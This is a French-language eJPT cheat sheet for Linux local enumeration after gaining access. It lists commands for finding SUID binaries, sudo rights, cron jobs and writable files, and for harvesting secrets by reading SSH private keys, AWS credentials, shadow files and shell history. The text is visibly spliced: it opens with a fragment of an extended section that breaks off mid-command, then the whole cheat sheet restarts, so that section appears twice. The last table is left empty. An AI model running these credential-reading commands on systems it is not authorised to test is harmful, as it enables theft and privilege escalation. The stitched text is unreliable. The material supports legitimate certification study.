### Points de montage
| Commande | Description |
|----------|-------------|
| `mount` | Points de montage actuels |
| `cat /etc/fstab` | Configuration des montages |
| `cat /proc/mounts` | Montages kernel |
| `lsblk` | Arbre des périphériques bloc |
| `df -h` | Espace disque |

---

## 🔍 4.1 Recherche avancée de fichiers avec find (SECTION ÉTENDUE)

### Fichiers intéressants par extension
| Commande | Description |
|----------|-------------|
| `find / -name "*.txt" 2>/dev/null \| head -20` | Fichiers texte |
| `find / -name "*.log" 2>/dev/null \| head -10` | Fichiers de log |
| `find / -name "*.conf" 2>/dev/null \| head -15` | Fichiers de configuration |
| `find / -name "*.config" 2>/dev/null \| head -15` | Fichiers config alternatifs |
| `find / -name "*.bak" 2>/dev/null` | Fichiers de sauvegarde |
| `find / -name "*.backup" 2>/dev/null` | Sauvegardes alternatives |
| `find / -name "*.old" 2>/dev/null` | Anciens fichiers |
| `find / -name "*.save" 2>/dev/null` | Fichiers sauvegardés |
| `find / -name "*.tmp" 2>/dev/null` | Fichiers temporaires |
| `find / -name "*.swp" 2>/dev/null` | Fichiers swap Vi/Vim |
| `find / -name "*.db" 2>/dev/null` | Bases de données |
| `find / -name "*.sql" 2>/dev/null` | Scripts SQL |
| `find / -name "*.xml" 2>/dev/null` | Fichiers XML |
| `find / -name "*.json" 2>/dev/null` | Fichiers JSON |
| `find / -name "*.yml" -o -name "*.yaml" 2>/dev/null` | Fichiers YAML |
| `find / -name "*.ini" 2>/dev/null` | Fichiers INI |
| `find / -name "*.properties" 2>/dev/null` | Fichiers properties |

### Recherche par mots-clés sensibles
| Commande | Description |
|----------|-------------|
| `find / -name "*password*" 2>/dev/null` | Fichiers avec "password" |
| `find / -name "*passwd*" 2>/dev/null` | Fichiers avec "passwd" |
| `find / -name "*secret*" 2>/dev/null` | Fichiers avec "secret" |
| `find / -name "*credential*" 2>/dev/null` | Fichiers avec "credential" |
| `find / -name "*login*" 2>/dev/null` | Fichiers avec "login" |
| `find / -name "*user*" 2>/dev/null \| head -20` | Fichiers avec "user" |
| `find / -name "*admin*" 2>/dev/null \| head -20` | Fichiers avec "admin" |
| `find / -name "*root*" 2>/dev/null \| head -20` | Fichiers avec "root" |
| `find / -name "*auth*" 2>/dev/null \| head -15` | Fichiers avec "auth" |
| `find / -name "*token*" 2>/dev/null` | Fichiers avec "token" |
| `find / -name "*api*" 2>/dev/null \| head -15` | Fichiers avec "api" |
| `find / -name "*private*" 2>/dev/null \| head -15` | Fichiers avec "private" |

### Recherche de clés et certificats
| Commande | Description |
|----------|-------------|
| `find / -name "*.key" 2>/dev/null` | Clés privées |
| `find / -name "*.pem" 2>/dev/null` | Certificats PEM |
| `find / -name "*.crt" 2>/dev/null` | Certificats |
| `find / -name "*.cer" 2>/dev/null` | Certificats CER |
| `find / -name "*.p12" 2>/dev/null` | Certificats PKCS#12 |
| `find / -name "*.pfx" 2>/dev/null` | Certificats PFX |
| `find / -name "*_rsa" 2>/dev/null` | Clés RSA |
| `find / -name "*_dsa" 2>/dev/null` | Clés DSA |
| `find / -name "*_ecdsa" 2>/dev/null` | Clés ECDSA |
| `find / -name "id_*" 2>/dev/null` | Clés SSH |
| `find / -name "authorized_keys" 2>/dev/null` | Clés SSH autorisées |
| `find / -name "known_hosts" 2>/dev/null` | Hôtes SSH connus |

### Recherche de scripts et exécutables
| Commande | Description |
|----------|-------------|
| `find / -name "*.sh" 2>/dev/null \| head -20` | Scripts shell |
| `find / -name "*.py" 2>/dev/null \| head -20` | Scripts Python |
| `find / -name "*.pl" 2>/dev/null \| head -15` | Scripts Perl |
| `find / -name "*.rb" 2>/dev/null \| head -15` | Scripts Ruby |
| `find / -name "*.php" 2>/dev/null \| head -15` | Scripts PHP |
| `find / -name "*.js" 2>/dev/null \| head -15` | Scripts JavaScript |
| `find / -type f -executable 2>/dev/null \| head -30` | Fichiers exécutables |
| `find / -type f -perm -u+x 2>/dev/null \| head -20` | Fichiers exécutables par user |

### Recherche par taille de fichier
| Commande | Description |
|----------|-------------|
| `find / -size +100M 2>/dev/null` | Fichiers > 100MB |
| `find / -size +50M -size -100M 2>/dev/null` | Fichiers entre 50-100MB |
| `find / -size +10M -size -50M 2>/dev/null \| head -10` | Fichiers entre 10-50MB |
| `find / -size +1M -size -10M 2>/dev/null \| head -15` | Fichiers entre 1-10MB |
| `find / -size -1k 2>/dev/null \| head -20` | Fichiers < 1KB |
| `find / -empty 2>/dev/null \| head -20` | Fichiers vides |

### Recherche par date de modification
| Commande | Description |
|----------|-------------|
| `find / -mtime -1 2>/dev/null \| head -20` | Modifiés dernières 24h |
| `find / -mtime -7 2>/dev/null \| head -30` | Modifiés dernière semaine |
| `find / -mtime +30 2>/dev/null \| head -20` | Modifiés il y a +30 jours |
| `find / -atime -1 2>/dev/null \| head -15` | Accédés dernières 24h |
| `find / -ctime -1 2>/dev/null \| head -15` | Créés dernières 24h |
| `find / -newer /etc/passwd 2>/dev/null \| head -15` | Plus récents que /etc/passwd |

### Recherche de fichiers dans répertoires spécifiques
| Commande | Description |
|----------|-------------|
| `find /home -type f -name "*.txt" 2>/dev/null` | Fichiers .txt dans /home |
| `find /var -name "*log*" 2>/dev/null \| head -20` | Logs dans /var |
| `find /etc -name "*conf*" 2>/dev/null` | Configs dans /etc |
| `find /opt -name "*" -type f 2>/dev/null \| head -20` | Fichiers dans /opt |
| `find /usr/local -name "*" -type f 2>/dev/null \| head -15` | Fichiers dans /usr/local |
| `find /srv -name "*" -type f 2>/dev/null` | Fichiers dans /srv |
| `find /root -name# 🐧 Linux Local Enumeration - Cheatsheet eJPT

## 🔍 1. Informations système de base

### Identification système
| Commande | Description | Information obtenue |
|----------|-------------|-------------------|
| `whoami` | Utilisateur actuel | Nom d'utilisateur |
| `id` | UID, GID et groupes | Identifiants numériques et appartenance groupes |
| `uname -a` | Informations kernel | Version kernel, architecture, hostname |
| `uname -r` | Version kernel | Version exacte du noyau |
| `uname -m` | Architecture | x86_64, i686, etc. |
| `hostname` | Nom de la machine | Nom d'hôte |
| `uptime` | Temps de fonctionnement | Durée d'activité et charge système |
| `date` | Date et heure | Horodatage actuel |

### Distribution et version
| Commande | Description |
|----------|-------------|
| `cat /etc/os-release` | Informations de distribution |
| `cat /etc/issue` | Version du système |
| `cat /etc/*release` | Toutes les infos de release |
| `lsb_release -a` | Infos LSB (si disponible) |
| `cat /proc/version` | Version détaillée du kernel |

---

## 👥 2. Utilisateurs et groupes

### Utilisateurs système
| Commande | Description |
|----------|-------------|
| `cat /etc/passwd` | Liste tous les utilisateurs |
| `cat /etc/passwd \| grep -v nologin \| grep -v false` | Utilisateurs avec shell |
| `cat /etc/passwd \| grep bash` | Utilisateurs avec bash |
| `cat /etc/group` | Liste des groupes |
| `groups` | Groupes de l'utilisateur actuel |
| `groups <username>` | Groupes d'un utilisateur spécifique |

### Utilisateurs connectés
| Commande | Description |
|----------|-------------|
| `w` | Utilisateurs connectés et activité |
| `who` | Utilisateurs connectés |
| `last` | Historique des connexions |
| `lastlog` | Dernières connexions par utilisateur |
| `users` | Liste simple des connectés |

### Informations utilisateur avancées
| Commande | Description |
|----------|-------------|
| `finger` | Informations détaillées (si disponible) |
| `getent passwd` | Base d'utilisateurs complète |
| `compgen -u` | Liste des utilisateurs (bash) |

---

## 🔐 3. Permissions et privilèges

### Sudo et privilèges
| Commande | Description |
|----------|-------------|
| `sudo -l` | Privilèges sudo disponibles |
| `sudo -V` | Version de sudo |
| `cat /etc/sudoers` | Configuration sudo (si accessible) |
| `cat /etc/sudoers.d/*` | Configurations sudo additionnelles |

### Fichiers SUID/SGID
| Commande | Description |
|----------|-------------|
| `find / -perm -4000 2>/dev/null` | Fichiers SUID |
| `find / -perm -2000 2>/dev/null` | Fichiers SGID |
| `find / -perm -6000 2>/dev/null` | Fichiers SUID et SGID |
| `find / -perm -1000 2>/dev/null` | Fichiers avec sticky bit |
| `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;` | SUID avec détails |

### Capabilities
| Commande | Description |
|----------|-------------|
| `getcap -r / 2>/dev/null` | Fichiers avec capabilities |
| `capsh --print` | Capabilities actuelles |
| `/sbin/getcap -r / 2>/dev/null` | Alternative path |

---

## 📁 4. Système de fichiers

### Répertoires accessibles en écriture
| Commande | Description |
|----------|-------------|
| `find / -writable -type d 2>/dev/null` | Répertoires writable |
| `find / -perm -222 -type f 2>/dev/null` | Fichiers writable |
| `find / -perm -o w -type d 2>/dev/null` | World-writable directories |
| `find / -perm -o x -type d 2>/dev/null` | World-executable directories |

### Fichiers intéressants par extension
| Commande | Description |
|----------|-------------|
| `find / -name "*.txt" 2>/dev/null \| head -20` | Fichiers texte |
| `find / -name "*.log" 2>/dev/null \| head -10` | Fichiers de log |
| `find / -name "*.conf" 2>/dev/null \| head -15` | Fichiers de configuration |
| `find / -name "*.config" 2>/dev/null \| head -15` | Fichiers config alternatifs |
| `find / -name "*.bak" 2>/dev/null` | Fichiers de sauvegarde |
| `find / -name "*.backup" 2>/dev/null` | Sauvegardes alternatives |
| `find / -name "*.old" 2>/dev/null` | Anciens fichiers |
| `find / -name "*.save" 2>/dev/null` | Fichiers sauvegardés |
| `find / -name "*.tmp" 2>/dev/null` | Fichiers temporaires |
| `find / -name "*.swp" 2>/dev/null` | Fichiers swap Vi/Vim |
| `find / -name "*.db" 2>/dev/null` | Bases de données |
| `find / -name "*.sql" 2>/dev/null` | Scripts SQL |
| `find / -name "*.xml" 2>/dev/null` | Fichiers XML |
| `find / -name "*.json" 2>/dev/null` | Fichiers JSON |
| `find / -name "*.yml" -o -name "*.yaml" 2>/dev/null` | Fichiers YAML |
| `find / -name "*.ini" 2>/dev/null` | Fichiers INI |
| `find / -name "*.properties" 2>/dev/null` | Fichiers properties |

### Recherche par mots-clés sensibles
| Commande | Description |
|----------|-------------|
| `find / -name "*password*" 2>/dev/null` | Fichiers avec "password" |
| `find / -name "*passwd*" 2>/dev/null` | Fichiers avec "passwd" |
| `find / -name "*secret*" 2>/dev/null` | Fichiers avec "secret" |
| `find / -name "*credential*" 2>/dev/null` | Fichiers avec "credential" |
| `find / -name "*login*" 2>/dev/null` | Fichiers avec "login" |
| `find / -name "*user*" 2>/dev/null \| head -20` | Fichiers avec "user" |
| `find / -name "*admin*" 2>/dev/null \| head -20` | Fichiers avec "admin" |
| `find / -name "*root*" 2>/dev/null \| head -20` | Fichiers avec "root" |
| `find / -name "*auth*" 2>/dev/null \| head -15` | Fichiers avec "auth" |
| `find / -name "*token*" 2>/dev/null` | Fichiers avec "token" |
| `find / -name "*api*" 2>/dev/null \| head -15` | Fichiers avec "api" |
| `find / -name "*private*" 2>/dev/null \| head -15` | Fichiers avec "private" |

### Recherche de clés et certificats
| Commande | Description |
|----------|-------------|
| `find / -name "*.key" 2>/dev/null` | Clés privées |
| `find / -name "*.pem" 2>/dev/null` | Certificats PEM |
| `find / -name "*.crt" 2>/dev/null` | Certificats |
| `find / -name "*.cer" 2>/dev/null` | Certificats CER |
| `find / -name "*.p12" 2>/dev/null` | Certificats PKCS#12 |
| `find / -name "*.pfx" 2>/dev/null` | Certificats PFX |
| `find / -name "*_rsa" 2>/dev/null` | Clés RSA |
| `find / -name "*_dsa" 2>/dev/null` | Clés DSA |
| `find / -name "*_ecdsa" 2>/dev/null` | Clés ECDSA |
| `find / -name "id_*" 2>/dev/null` | Clés SSH |
| `find / -name "authorized_keys" 2>/dev/null` | Clés SSH autorisées |
| `find / -name "known_hosts" 2>/dev/null` | Hôtes SSH connus |

### Recherche de scripts et exécutables
| Commande | Description |
|----------|-------------|
| `find / -name "*.sh" 2>/dev/null \| head -20` | Scripts shell |
| `find / -name "*.py" 2>/dev/null \| head -20` | Scripts Python |
| `find / -name "*.pl" 2>/dev/null \| head -15` | Scripts Perl |
| `find / -name "*.rb" 2>/dev/null \| head -15` | Scripts Ruby |
| `find / -name "*.php" 2>/dev/null \| head -15` | Scripts PHP |
| `find / -name "*.js" 2>/dev/null \| head -15` | Scripts JavaScript |
| `find / -type f -executable 2>/dev/null \| head -30` | Fichiers exécutables |
| `find / -type f -perm -u+x 2>/dev/null \| head -20` | Fichiers exécutables par user |

### Recherche par taille de fichier
| Commande | Description |
|----------|-------------|
| `find / -size +100M 2>/dev/null` | Fichiers > 100MB |
| `find / -size +50M -size -100M 2>/dev/null` | Fichiers entre 50-100MB |
| `find / -size +10M -size -50M 2>/dev/null \| head -10` | Fichiers entre 10-50MB |
| `find / -size +1M -size -10M 2>/dev/null \| head -15` | Fichiers entre 1-10MB |
| `find / -size -1k 2>/dev/null \| head -20` | Fichiers < 1KB |
| `find / -empty 2>/dev/null \| head -20` | Fichiers vides |

### Recherche par date de modification
| Commande | Description |
|----------|-------------|
| `find / -mtime -1 2>/dev/null \| head -20` | Modifiés dernières 24h |
| `find / -mtime -7 2>/dev/null \| head -30` | Modifiés dernière semaine |
| `find / -mtime +30 2>/dev/null \| head -20` | Modifiés il y a +30 jours |
| `find / -atime -1 2>/dev/null \| head -15` | Accédés dernières 24h |
| `find / -ctime -1 2>/dev/null \| head -15` | Créés dernières 24h |
| `find / -newer /etc/passwd 2>/dev/null \| head -15` | Plus récents que /etc/passwd |

### Recherche de fichiers dans répertoires spécifiques
| Commande | Description |
|----------|-------------|
| `find /home -type f -name "*.txt" 2>/dev/null` | Fichiers .txt dans /home |
| `find /var -name "*log*" 2>/dev/null \| head -20` | Logs dans /var |
| `find /etc -name "*conf*" 2>/dev/null` | Configs dans /etc |
| `find /opt -name "*" -type f 2>/dev/null \| head -20` | Fichiers dans /opt |
| `find /usr/local -name "*" -type f 2>/dev/null \| head -15` | Fichiers dans /usr/local |
| `find /srv -name "*" -type f 2>/dev/null` | Fichiers dans /srv |
| `find /root -name "*" 2>/dev/null` | Fichiers dans /root (si accessible) |
| `find /tmp -name "*" -type f 2>/dev/null` | Fichiers dans /tmp |
| `find /var/tmp -name "*" -type f 2>/dev/null` | Fichiers dans /var/tmp |
| `find /dev/shm -name "*" -type f 2>/dev/null` | Fichiers dans /dev/shm |

### Recherche avancée avec grep dans les fichiers
| Commande | Description |
|----------|-------------|
| `find / -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null` | .txt contenant "password" |
| `find / -name "*.conf" -exec grep -l "user" {} \; 2>/dev/null` | .conf contenant "user" |
| `find / -name "*.log" -exec grep -l "error" {} \; 2>/dev/null \| head -10` | .log avec erreurs |
| `find / -name "*.sh" -exec grep -l "sudo" {} \; 2>/dev/null` | Scripts avec sudo |
| `find / -name "*.py" -exec grep -l "password" {} \; 2>/dev/null` | Python avec passwords |
| `find / -name "*.php" -exec grep -l "mysql" {} \; 2>/dev/null` | PHP avec MySQL |
| `find / -name "*.xml" -exec grep -l "credential" {} \; 2>/dev/null` | XML avec credentials |
| `find / -name "*.json" -exec grep -l "token" {} \; 2>/dev/null` | JSON avec tokens |

### Recherche de permissions spéciales avancées
| Commande | Description |
|----------|-------------|
| `find / -perm -4000 -user root 2>/dev/null` | SUID root uniquement |
| `find / -perm -2000 -group root 2>/dev/null` | SGID root uniquement |
| `find / -perm -4755 2>/dev/null` | SUID avec permissions 755 |
| `find / -perm -2755 2>/dev/null` | SGID avec permissions 755 |
| `find / -perm -777 2>/dev/null` | Permissions 777 (full access) |
| `find / -perm -666 -type f 2>/dev/null \| head -15` | Fichiers 666 (rw pour tous) |
| `find / -perm -o=w 2>/dev/null \| head -20` | World-writable |
| `find / -perm -o=x -type f 2>/dev/null \| head -15` | World-executable files |
| `find / -perm -g=w 2>/dev/null \| head -15` | Group-writable |
| `find / -perm -u=s 2>/dev/null` | Fichiers SUID (user) |
| `find / -perm -g=s 2>/dev/null` | Fichiers SGID (group) |

### Recherche de fichiers système critiques
| Commande | Description |
|----------|-------------|
| `find / -name "shadow" 2>/dev/null` | Fichiers shadow |
| `find / -name "passwd" 2>/dev/null` | Fichiers passwd |
| `find / -name "sudoers*" 2>/dev/null` | Fichiers sudoers |
| `find / -name "hosts" 2>/dev/null` | Fichiers hosts |
| `find / -name "fstab" 2>/dev/null` | Fichiers fstab |
| `find / -name "exports" 2>/dev/null` | Fichiers exports NFS |
| `find / -name "crontab" 2>/dev/null` | Fichiers crontab |
| `find / -name "*.pid" 2>/dev/null \| head -10` | Fichiers PID |
| `find / -name "*.sock" 2>/dev/null \| head -10` | Fichiers socket |

### Recherche de fichiers de développement
| Commande | Description |
|----------|-------------|
| `find / -name "Makefile" 2>/dev/null \| head -10` | Makefiles |
| `find / -name "*.c" 2>/dev/null \| head -15` | Code source C |
| `find / -name "*.cpp" -o -name "*.cc" 2>/dev/null \| head -10` | Code C++ |
| `find / -name "*.h" 2>/dev/null \| head -15` | Headers C/C++ |
| `find / -name "*.java" 2>/dev/null \| head -10` | Code Java |
| `find / -name "*.go" 2>/dev/null \| head -10` | Code Go |
| `find / -name "*.rs" 2>/dev/null \| head -10` | Code Rust |
| `find / -name "requirements.txt" 2>/dev/null` | Dépendances Python |
| `find / -name "package.json" 2>/dev/null` | Projets Node.js |
| `find / -name "Cargo.toml" 2>/dev/null` | Projets Rust |
| `find / -name "pom.xml" 2>/dev/null` | Projets Maven |
| `find / -name "build.gradle" 2>/dev/null` | Projets Gradle |

### Recherche de fichiers de données sensibles
| Commande | Description |
|----------|-------------|
| `find / -name "*.sqlite*" 2>/dev/null` | Bases SQLite |
| `find / -name "*.dump" 2>/dev/null` | Fichiers dump |
| `find / -name "*.dmp" 2>/dev/null` | Fichiers dump alternatifs |
| `find / -name "*.csv" 2>/dev/null \| head -15` | Fichiers CSV |
| `find / -name "*.xlsx" -o -name "*.xls" 2>/dev/null` | Fichiers Excel |
| `find / -name "*.pdf" 2>/dev/null \| head -20` | Fichiers PDF |
| `find / -name "*.doc*" 2>/dev/null \| head -10` | Documents Word |
| `find / -name "*.zip" -o -name "*.tar*" -o -name "*.gz" 2>/dev/null \| head -15` | Archives |
| `find / -name "*.rar" -o -name "*.7z" 2>/dev/null` | Archives compressées |

### Répertoires temporaires
| Répertoire | Commande | Description |
|------------|----------|-------------|
| `/tmp` | `ls -la /tmp` | Répertoire temporaire principal |
| `/var/tmp` | `ls -la /var/tmp` | Répertoire temporaire système |
| `/dev/shm` | `ls -la /dev/shm` | Mémoire partagée |

### Recherche combinée et complexe
| Commande | Description |
|----------|-------------|
| `find / \( -name "*.txt" -o -name "*.log" \) -exec grep -l "password" {} \; 2>/dev/null` | .txt/.log avec "password" |
| `find / -type f -size +1M -name "*secret*" 2>/dev/null` | Fichiers >1MB avec "secret" |
| `find / -type f -perm -o+w -name "*.sh" 2>/dev/null` | Scripts world-writable |
| `find / -type f -user root -perm -o+w 2>/dev/null \| head -15` | Fichiers root world-writable |
| `find / -type f \( -name "*.key" -o -name "*.pem" \) -ls 2>/dev/null` | Clés avec détails |
| `find / -type f -name "*" -newer /etc/passwd -not -path "/proc/*" 2>/dev/null \| head -20` | Fichiers récents (hors /proc) |
| `find / -type f -executable -name "*admin*" 2>/dev/null` | Exécutables avec "admin" |
| `find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null` | SUID/SGID avec détails |

### Recherche dans les applications web courantes
| Commande | Description |
|----------|-------------|
| `find /var/www -name "*.php" -exec grep -l "mysql_connect\|mysqli\|PDO" {} \; 2>/dev/null` | PHP avec DB |
| `find /var/www -name "config*" -type f 2>/dev/null` | Configs web |
| `find /var/www -name "*.conf*" -o -name "*.config" 2>/dev/null` | Configurations web |
| `find /var/www -name "wp-config*" 2>/dev/null` | Config WordPress |
| `find /var/www -name ".env" 2>/dev/null` | Fichiers d'environnement |
| `find /var/www -name "*.sql" 2>/dev/null` | Scripts SQL web |
| `find /var/www -name "*backup*" -o -name "*.bak" 2>/dev/null` | Sauvegardes web |

### Recherche dans les répertoires utilisateurs
| Commande | Description |
|----------|-------------|
| `find /home -name ".*" -type f 2>/dev/null \| head -30` | Fichiers cachés dans /home |
| `find /home -name ".ssh" -type d 2>/dev/null` | Répertoires .ssh |
| `find /home -name ".bash_history" 2>/dev/null` | Historiques bash |
| `find /home -name ".*_history" 2>/dev/null` | Tous historiques |
| `find /home -name ".profile" -o -name ".bashrc" -o -name ".zshrc" 2>/dev/null` | Profils shell |
| `find /home -name "Desktop" -type d 2>/dev/null` | Bureaux utilisateurs |
| `find /home -name "Downloads" -type d 2>/dev/null` | Téléchargements |
| `find /home -name "Documents" -type d 2>/dev/null` | Documents utilisateurs |

### One-liners de recherche massive
| Commande | Description |
|----------|-------------|
| `find / -type f \( -name "*password*" -o -name "*secret*" -o -name "*credential*" -o -name "*token*" \) 2>/dev/null` | Tous fichiers sensibles |
| `find / -type f \( -name "*.key" -o -name "*.pem" -o -name "*.crt" -o -name "*_rsa" \) 2>/dev/null` | Toutes clés/certificats |
| `find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" \) 2>/dev/null \| head -30` | Tous fichiers config |
| `find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*.save" \) 2>/dev/null \| head -20` | Toutes sauvegardes |
| `find / -type f \( -name "*.sh" -o -name "*.py" -o -name "*.pl" -o -name "*.rb" \) -executable 2>/dev/null \| head -25` | Tous scripts exécutables |

---

## ⏰ 5. Tâches planifiées et services

### Cron jobs
| Commande | Description |
|----------|-------------|
| `crontab -l` | Tâches cron de l'utilisateur |
| `cat /etc/crontab` | Tâches cron système |
| `cat /etc/cron.d/*` | Cron jobs additionnels |
| `ls -la /etc/cron.*` | Répertoires cron |
| `cat /etc/cron.hourly/*` | Scripts horaires |
| `cat /etc/cron.daily/*` | Scripts quotidiens |
| `cat /etc/cron.weekly/*` | Scripts hebdomadaires |
| `cat /etc/cron.monthly/*` | Scripts mensuels |

### Systemd timers
| Commande | Description |
|----------|-------------|
| `systemctl list-timers` | Timers systemd actifs |
| `systemctl list-timers --all` | Tous les timers |

### Services
| Commande | Description |
|----------|-------------|
| `systemctl list-units --type=service` | Services systemd |
| `systemctl list-units --type=service --state=running` | Services actifs |
| `service --status-all` | Services SysV |
| `chkconfig --list` | Services au boot (CentOS/RHEL) |
| `update-rc.d -n -f <service> remove` | Test suppression service |

---

## 🔧 6. Processus et démons

### Processus en cours
| Commande | Description |
|----------|-------------|
| `ps aux` | Tous les processus |
| `ps -ef` | Processus avec PPID |
| `ps auxf` | Arbre des processus |
| `ps -eo pid,ppid,cmd,comm` | Format personnalisé |
| `pstree` | Arbre des processus (si disponible) |

### Processus par utilisateur
| Commande | Description |
|----------|-------------|
| `ps aux \| grep root` | Processus root |
| `ps aux \| grep $USER` | Processus de l'utilisateur actuel |

### Surveillance des processus
| Commande | Description |
|----------|-------------|
| `top` | Processus en temps réel |
| `htop` | Interface améliorée (si disponible) |
| `watch "ps aux"` | Surveillance continue |

---

## 🌐 7. Réseau et connectivité

### Interfaces et adresses
| Commande | Description |
|----------|-------------|
| `ifconfig` | Configuration interfaces (deprecated) |
| `ip addr show` | Adresses IP (moderne) |
| `ip link show` | Interfaces réseau |
| `ip route show` | Table de routage |
| `cat /etc/hosts` | Résolution locale |
| `cat /etc/resolv.conf` | Serveurs DNS |

### Connexions réseau
| Commande | Description |
|----------|-------------|
| `netstat -tulpn` | Ports ouverts et services |
| `netstat -an` | Toutes les connexions |
| `ss -tulpn` | Alternative moderne à netstat |
| `ss -an` | Toutes les connexions (ss) |
| `lsof -i` | Fichiers réseau ouverts |

### ARP et routage
| Commande | Description |
|----------|-------------|
| `arp -a` | Table ARP |
| `ip neigh` | Voisins réseau (moderne) |
| `route -n` | Table de routage |
| `netstat -rn` | Table de routage |

---

## 🔍 8. Recherche de credentials et secrets

### Fichiers de configuration
| Commande | Description |
|----------|-------------|
| `grep -r "password" /etc/ 2>/dev/null` | "password" dans /etc |
| `grep -r "pass" /var/www/ 2>/dev/null` | Credentials web |
| `grep -r "user" /opt/ 2>/dev/null` | Users dans /opt |
| `find /home -name "*.txt" -exec grep -l "pass" {} \;` | Fichiers avec "pass" |

### Historiques
| Fichier | Description |
|---------|-------------|
| `cat ~/.bash_history` | Historique bash |
| `cat ~/.zsh_history` | Historique zsh |
| `cat ~/.mysql_history` | Historique MySQL |
| `cat ~/.python_history` | Historique Python |
| `cat ~/.nano_history` | Historique nano |

### Fichiers de configuration spécifiques
| Fichier | Description |
|---------|-------------|
| `cat ~/.ssh/config` | Configuration SSH |
| `cat ~/.ssh/authorized_keys` | Clés SSH autorisées |
| `cat ~/.ssh/id_rsa` | Clé privée RSA |
| `cat ~/.aws/credentials` | Credentials AWS |
| `cat ~/.docker/config.json` | Config Docker |

### Recherche de clés
| Commande | Description |
|----------|-------------|
| `find / -name "*.key" 2>/dev/null` | Fichiers .key |
| `find / -name "*_rsa" 2>/dev/null` | Clés RSA |
| `find / -name "*_dsa" 2>/dev/null` | Clés DSA |
| `find / -name "id_*" 2>/dev/null` | Clés SSH |
| `find / -name "authorized_keys" 2>/dev/null` | Clés autorisées |

---

## 💾 9. Variables d'environnement et logs

### Variables d'environnement
| Commande | Description |
|----------|-------------|
| `env` | Toutes les variables |
| `echo $PATH` | Variable PATH |
| `echo $HOME` | Répertoire home |
| `echo $USER` | Utilisateur actuel |
| `echo $SHELL` | Shell par défaut |
| `printenv` | Alternative à env |

### Logs système
| Fichier | Description |
|---------|-------------|
| `/var/log/auth.log` | Logs d'authentification |
| `/var/log/syslog` | Logs système généraux |
| `/var/log/messages` | Messages système |
| `/var/log/secure` | Logs sécurité (RedHat) |
| `/var/log/apache2/access.log` | Logs Apache |
| `/var/log/nginx/access.log` | Logs Nginx |

---

## 🛠️ 10. Outils et applications installées

### Packages installés
| Commande | Distribution | Description |
|----------|-------------|-------------|
| `dpkg -l` | Debian/Ubuntu | Packages installés |
| `apt list --installed` | Debian/Ubuntu | Liste APT |
| `rpm -qa` | RedHat/CentOS | Packages RPM |
| `yum list installed` | RedHat/CentOS | Liste YUM |
| `pacman -Q` | Arch | Packages installés |

### Binaires disponibles
| Commande | Description |
|----------|-------------|
| `which python` | Localisation Python |
| `which python3` | Localisation Python3 |
| `which gcc` | Compilateur C |
| `which perl` | Interpréteur Perl |
| `which ruby` | Interpréteur Ruby |
| `which wget` | Outil de téléchargement |
| `which curl` | Client HTTP |

### Langages de programmation
| Commande | Description |
|----------|-------------|
| `python --version` | Version Python |
| `python3 --version` | Version Python3 |
| `gcc --version` | Version GCC |
| `perl --version` | Version Perl |
| `ruby --version` | Version Ruby |

---

## 🔒 11. Sécurité et protection

### AppArmor/SELinux
| Commande | Description |
|----------|-------------|
| `aa-status` | Statut AppArmor |
| `cat /etc/apparmor.d/*` | Profils AppArmor |
| `sestatus` | Statut SELinux |
| `getenforce` | Mode SELinux |

### Firewall
| Commande | Description |
|----------|-------------|
| `iptables -L` | Règles iptables |
| `ufw status` | Statut UFW |
| `firewall-cmd --list-all` | Configuration firewalld |

---

## 🚀 12. Scripts d'énumération one-liner

### Énumération rapide système
```bash
echo "=== SYSTEM ===" && uname -a && echo "=== USER ===" && id && echo "=== SUDO ===" && sudo -l 2>/dev/null && echo "=== SUID ===" && find / -perm -4000 2>/dev/null | head -10
```

### Énumération réseau rapide
```bash
echo "=== NETWORK ===" && ip addr show && echo "=== LISTENING ===" && netstat -tulpn && echo "=== CONNECTIONS ===" && netstat -an | head -10
```

### Recherche de fichiers intéressants
```bash
echo "=== WRITABLE DIRS ===" && find / -writable -type d 2>/dev/null | head -10 && echo "=== SUID FILES ===" && find / -perm -4000 2>/dev/null && echo "=== INTERESTING FILES ===" && find / -name "*password*" -o -name "*secret*" -o -name "*.key" 2>/dev/null
```

---

## 💡 13. Workflow d'énumération recommandé

### Phase 1: Reconnaissance de base (30 secondes)
```bash
whoami && id && uname -a && sudo -l
```

### Phase 2: Fichiers SUID et capabilities (1 minute)
```bash
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
```

### Phase 3: Tâches planifiées (1 minute)
```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

### Phase 4: Processus et services (30 secondes)
```bash
ps aux | grep root
systemctl list-units --type=service --state=running
```

### Phase 5: Réseau (30 secondes)
```bash
ip addr show
netstat -tulpn
```

### Phase 6: Recherche de secrets (2 minutes)
```bash
find / -name "*password*" -o -name "*secret*" -o -name "*.key" 2>/dev/null
grep -r "password" /etc/ 2>/dev/null | head -5
cat ~/.bash_history 2>/dev/null | grep -i pass
```

---

## 🎯 14. Points critiques pour l'eJPT

### ⭐ Commandes prioritaires
1. **`sudo -l`** - Toujours en premier !
2. **`find / -perm -4000 2>/dev/null`** - SUID files
3. **`cat /etc/crontab`** - Cron jobs
4. **`ps aux | grep root`** - Processus root
5. **`netstat -tulpn`** - Services réseau

### ⭐ Fichiers à vérifier systématiquement
- `/etc/passwd` - Utilisateurs
- `/etc/crontab` - Tâches planifiées  
- `~/.bash_history` - Historique
- `/etc/fstab` - Montages
- `/var/log/auth.log` - Logs auth

### ⭐ Escalation vectors courants eJPT
- **Sudo misconfiguration** (`sudo -l`)
- **SUID binaries** (GTFOBins)
- **Writable cron jobs**
- **Path hijacking**
- **Kernel exploits**

---

## 📝 15. Aide-mémoire complet

```bash
# Énumération complète en une commande
echo "USER: $(whoami) | UID: $(id -u) | GROUPS: $(groups)" && echo "SYSTEM: $(uname -a)" && echo "SUDO: $(sudo -l 2>/dev/null)" && echo "SUID: $(find / -perm -4000 2>/dev/null | wc -l) files" && echo "CRON: $(cat /etc/crontab 2>/dev/null | grep -v '^#' | wc -l) jobs"
```

## 🚨 16. Misconfigurations critiques à vérifier

### 🔴 Fichiers système modifiables (CRITIQUE)
| Fichier | Commande de vérification | Exploitation si writable |
|---------|-------------------------|-------------------------|
